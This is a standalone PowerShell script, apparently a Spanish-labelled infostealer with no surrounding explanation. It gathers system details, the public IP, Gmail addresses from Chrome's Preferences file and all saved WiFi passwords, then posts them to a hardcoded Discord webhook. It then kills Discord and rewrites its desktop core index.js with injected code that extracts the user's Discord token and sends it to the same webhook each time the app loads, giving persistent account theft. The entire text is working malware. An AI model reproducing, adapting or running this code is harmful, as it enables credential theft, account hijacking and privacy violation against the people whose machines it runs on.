
$w='https://discord.com/api/webhooks/1491757973813592106/iExPACCLwXkwELyQP3umFFblHEguwriYgJt2SQCYCUlAPMadnMISKqVDA6eecFbOLgzU';
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
$ip=try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'};
$b=try{((netsh wlan show int|sls BSSID).ToString().Split(':')[1..6]-join':').Trim()}catch{'N/A'};
$h=(GWMI Win32_Processor).Name;
$r=[math]::round((GWMI Win32_PhysicalMemory|Measure Capacity -Sum).Sum/1GB,0);
$s=(GWMI Win32_Bios).SerialNumber;
$out="REPORTE: $env:COMPUTERNAME ($env:USERNAME) | IP: $ip | BSSID: $b`nHW: $h | RAM: ${r}GB | SN: $s`n`nCUENTAS:`n";
$cp="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences";
if(Test-Path $cp){$emails=[regex]::Matches((GC $cp -Raw),'[\w\.-]+@gmail\.com')|%{$_.Value}|select -Unique;foreach($e in $emails){$out+="- $e`n"}};
$out+="`nWIFI:`n";
$pr=(netsh wlan show prof|sls '\:(.+)$'|%{$_.Matches.Groups[1].Value.Trim()});
foreach($n in $pr){$v=netsh wlan show prof name="$n" key=clear|sls 'Key Content|Contenido';if($v){$p=$v.ToString().Split(':')[1].Trim();$out+="SSID: $n | Pass: $p`n"}};
$j=@{content='```'+$out+'```'}|ConvertTo-Json;
Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($j)) -ContentType 'application/json';

Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue;
$f=(Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1);
if($f){
    $js=@'
const {app,net}=require("electron"),U="https://discord.com/api/webhooks/1491757973813592106/iExPACCLwXkwELyQP3umFFblHEguwriYgJt2SQCYCUlAPMadnMISKqVDA6eecFbOLgzU";let l=null;
app.on("browser-window-created",(e,w)=>{w.webContents.on("did-finish-load",()=>{w.webContents.executeJavaScript(`(function(){const f=()=>{try{window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m of Object.keys(r.c).map(x=>r.c[x].exports)){if(m&&m.default&&typeof m.default.getToken=="function"){let t=m.default.getToken();if(typeof t==="string"){console.log("T:"+t);return true}}}}])}catch(e){}return false};if(!f()){const i=setInterval(()=>{if(f())clearInterval(i)},1000)}})()`)}) ;
w.webContents.on("console-message",(e,lvl,m)=>{if(m.startsWith("T:")){const t=m.split("T:")[1];if(t!==l&&t.length>10){l=t;const r=net.request({method:"POST",url:U});r.setHeader("Content-Type","application/json");r.write(JSON.stringify({content:"**Token:** `"+t+"`"}));r.end()}}})});
module.exports=require("./core.asar");
'@
    [System.IO.File]::WriteAllText($f,$js);
    Start-Process "$env:LOCALAPPDATA\Discord\Update.exe" "-processStart Discord.exe"
}
